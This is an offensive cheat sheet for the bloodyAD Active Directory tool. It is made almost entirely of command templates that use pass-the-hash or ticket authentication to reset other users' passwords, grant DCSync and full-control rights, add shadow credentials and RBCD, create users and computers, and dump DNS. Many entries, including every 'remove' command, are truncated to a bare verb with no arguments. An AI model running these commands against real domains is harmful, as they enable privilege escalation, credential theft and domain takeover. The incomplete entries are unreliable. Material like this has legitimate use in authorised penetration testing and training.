# bloodyAD

% windows, Active directory
#plateform/linux #target/remote  #cat/ATTACK/DACL-ABUSE

## auth (cred)
```bash
-u <user> -p <password>
```

## auth (pth)
```bash
-u <user> -p :<nt_hash>
```

## auth (ptt)
```bash
-k
```

## auth (cert)
```bash
-c <key_path>:<pem_path>
```

## cross-domain actions
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p
```

## set - change user password (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
```

## set cross-domain - change user password (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <target_dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
```

## set - add/replace/delete target attribute  (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute> -v <value>
```

## set - object onwer (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```



## add - add computer (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Zaebuj12345+->
```
## add - DCSync right (pth)
https://github.com/CravateRouge/bloodyAD
sAMAccountName, DN, GUID or SID of the trustee
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  dcsync <trustee>
```
## add - DNS record (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
```
## add - full control (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add genericAll <target> <trustee>
```
## add - groupMember (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  groupMember <group_sam> <target_sam>
```
## add - rbcd (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  rbcd <target>  <source>
```
## add - shadowCredentials (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
```
## add - uac (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
```
## add - user (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Zaebuj12345+-> 
```

## get - list children of an object (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get  
```
## get - DNS dump records (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain_fqdn>  
```
## get - membership (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get membership <target_sAMAccountName>
```
## get - object (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get object --resolve-sd <target_sAMAccountName>
```
## get - search (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get search --filter '<ldap_filter|(objectClass=*)>' --attr <comma_sep_attr_list|'*'> --resolve-sd  <search_base|DC=domain,DC=tld>
```
## get - writable (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get writable
```

## remove - DCSync (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - DNS record (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - full control (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - groupMember (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - object (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - rbcd (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - shadowCredentials (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - uac (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyad --host <dc_ip> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```

